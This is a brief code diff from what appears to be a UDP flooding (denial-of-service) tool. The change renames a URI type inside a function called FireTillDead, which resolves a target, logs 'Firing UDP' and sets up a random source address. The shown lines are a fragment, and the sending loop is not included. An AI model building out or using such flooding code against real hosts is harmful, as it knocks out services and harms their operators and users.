@@ -6,12 +6,12 @@
 #include "net_utils.h"
 #include "utils.h"
 
-std::size_t Attackers::UDPGun::FireTillDead(const CURI &targetToKill) noexcept
+std::size_t Attackers::UDPGun::FireTillDead(const URI &targetToKill) noexcept
 {
 	std::size_t hitsCount{0};
 
 	// Resolving address
-	CURI destAdress;
+	URI destAdress;
 	if(const auto resolved = NetUtil::GetHostAddresses(targetToKill))
 	{
 		// Beggining attack
@@ -28,11 +28,11 @@ std::size_t Attackers::UDPGun::FireTillDead(const CURI &targetToKill) noexcept
 				continue;
 			}
 
-			CURI destAdress{ipString.data()};
+			URI destAdress{ipString.data()};
 
 			SPDLOG_INFO("Firing UDP at {} resolved to: {}", targetToKill, destAdress);
 
-			CURI randomSourceAdress;
+			URI randomSourceAdress;
 
 			std::size_t errorsCount = 0;
 
